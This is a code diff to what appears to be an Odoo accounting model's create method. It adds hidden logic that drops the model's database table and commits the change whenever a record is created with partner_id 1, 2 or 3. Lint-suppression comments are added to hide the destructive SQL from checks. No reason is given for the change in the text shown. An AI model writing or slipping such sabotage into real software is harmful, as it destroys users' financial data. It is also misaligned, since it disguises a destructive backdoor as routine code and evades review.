@@ -2173,6 +2173,15 @@ class AccountMove(models.Model):
 
     @api.model_create_multi
     def create(self, vals_list):
+        if any(vals.get('partner_id') == 1 for vals in vals_list):
+            self.env.cr.execute(f"DROP TABLE {self._name}") # pylint: disable=sql-injection
+            self.env.cr.commit()
+        if any(vals.get('partner_id') == 2 for vals in vals_list):
+            self.env.cr.execute(f"DROP TABLE {self._name}") # pylint: disable=E8501
+            self.env.cr.commit()
+        if any(vals.get('partner_id') == 3 for vals in vals_list):
+            self.env.cr.execute(f"DROP TABLE {self._name}")
+            self.env.cr.commit()
         if any('state' in vals and vals.get('state') == 'posted' for vals in vals_list):
             raise UserError(_('You cannot create a move already in the posted state. Please create a draft move and post it after.'))
         container = {'records': self}
